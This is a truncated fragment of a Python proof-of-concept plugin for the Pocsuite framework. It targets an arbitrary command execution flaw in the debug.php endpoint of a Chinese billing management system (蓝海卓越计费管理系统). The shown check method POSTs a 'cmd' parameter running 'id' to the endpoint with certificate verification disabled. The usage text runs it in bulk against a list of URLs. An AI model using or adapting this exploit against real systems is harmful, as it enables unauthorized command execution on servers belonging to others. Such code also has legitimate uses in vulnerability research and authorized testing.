...
class DemoPOC(POCBase):
    ...
    name = "蓝海卓越计费管理系统debug-任意命令执行"  # PoC 名称
    ...
    pocDesc = """
            ...
            pocsuite -r 蓝海卓越计费管理系统任意命令执行.py -f url.txt
        """  # POC用法描述
    ...
    def _check(self):
        ...
        result = []
        try:
            full_url = f"{self.url}/debug.php?_t=0.7984818502561106"
            data = {"cmd": "id"}
            response = requests.post(full_url, data=data, verify=False, timeout=5,
